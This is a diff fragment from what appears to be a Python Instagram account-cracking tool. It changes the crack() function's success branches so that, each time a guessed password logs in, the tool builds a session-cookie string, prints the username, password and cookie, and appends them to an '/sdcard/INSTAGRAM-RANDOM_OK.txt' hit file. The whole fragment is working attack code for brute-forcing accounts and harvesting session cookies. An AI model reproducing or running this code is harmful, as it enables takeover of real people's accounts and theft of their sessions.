@@ -2194,23 +2194,26 @@ def crack(uid, pww, total_idz):
                 json_response = response.json()
                 if json_response.get('status') == 'ok':
                    if json_response.get('authenticated') == True:
+                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        print(f"\r\033[1;92m [cookie] {cookie}")
+                        open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                         oks.append(uid)
-                        return True
+                        break
                    elif json_response.get('auth_token'):
+                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        print(f"\r\033[1;92m [cookie] {cookie}")
+                        open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                         oks.append(uid)
-                        return True
+                        break
                    elif 'sessionid' in session_cookies:
+                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        print(f"\r\033[1;92m [cookie] {cookie}")
+                        open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                         oks.append(uid)
-                        return True
+                        break
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
